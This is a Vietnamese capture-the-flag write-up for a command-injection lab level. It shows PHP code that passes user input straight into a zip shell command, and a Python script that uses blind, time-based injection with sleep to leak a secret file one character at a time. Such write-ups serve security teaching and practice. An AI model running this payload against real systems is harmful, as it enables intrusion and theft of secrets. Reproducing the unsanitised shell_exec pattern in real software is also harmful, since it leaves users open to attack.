# Command Injection Level 7

## __1. Sử dụng như người dùng:__
Ở lv7 cũng đã chặn như ở lv6 và dùng Payload ở lv6 cũng không được.  
Giao diện có 1 chút thay đổi.  
![](1.PNG)  
Khi chạy thì luôn trả về "___Đã chạy câu lệnh backup___" không còn chạy được hay không chạy được như trước nữa.

## __2. Xem đằng sau chương trình:__
- File `index.php`: Có sự thay đổi
```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
                # Backup to /tmp/ folder and prevent writable to document root 
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                die("Đã chạy câu lệnh backup");
                break;
            // CHANGELOG: Bảo trì
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target &2 > 1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target &2 > 1");
			// 	break;	
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target &2 > 1");
			// 	break;
		}
        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");
    }
?>
```
Đúng như đã dự đoán ở phần sử dụng thì lúc này anh Dev đã không còn trả về kết quả `output` lúc chạy lệnh command mà chỉ trả về "___Đã chạy câu lệnh backup___" với bất kì kết quả nào.

## __3. Lên ý tưởng và Khai thác:__
### a. <ins>Ý tưởng</ins>:
Ở thực tế khi mình làm gì có lỗi mà mình không biết mình đã làm gì để bị người yêu giận thì mình sẽ làm gì để biết được lỗi nhỉ? Mình sẽ đi hỏi người yêu về các lỗi có thể mình mắc phải và lúc này sẽ có 2 trường hợp xảy ra:
- Nếu `sai`: thì người yêu sẽ trả lời `không phải`.
- Nếu `đúng`: thì người yêu vẫn sẽ trả lời `không phải` nhưng sẽ có 1 khoảng thời gian để trả lời &rarr; tín hiệu của vũ trụ cho rằng có thể là lỗi này làm người yêu của bạn giận (có vẻ là vậy thôi vì đây chỉ là lý thuyết 🤡)

Vậy mình cũng sẽ dùng cách này để đưa vào khai thác lỗi.

### b. <ins>Khai thác</ins>:
__Payload:__
```python
import requests as rq
import time

# create array of strings
array = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","0", "1", "2", "3", "4", "5", "6", "7", "8", "9","a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","!", "@", "#", "_",  "%", "&", "", "(", ")", "+", "=", "|", "\"", "}", "{", "]", "[", ":", ";", "'", "\"", ",", "<", ".", ">", "/", "?", "~", "`", " "]

mydata = {'command': 'backup', 'target': '111;echo $(cat /secret.txt) | cut -c1 | grep "C" && sleep 1;'}
url='http://localhost:1006/'
# def function post request with command and taget parameter in url and return time of response
def send_request_with_param_post(url, data):
    start = time.time()
    rq.post(url, data)
    end= time.time()
    return end - start

flag=""

for i in range(1,40):
    #foreach array element
    for j in array:
        #create new data with command and target parameter
        mydata = {'command': 'backup', 'target': '111;echo $(cat /secret*.txt) | cut -c'+str(i)+' | grep '+j+' && sleep 1;'}
        #send request with new data
        rt=time.strftime("%S", time.gmtime(send_request_with_param_post(url, mydata)))
        if(rt>="01"):
            flag+=j
            print(flag)
            break
```
![](2.PNG)
> CBJS{FAKE_FLAG_FAKE_FLAG}

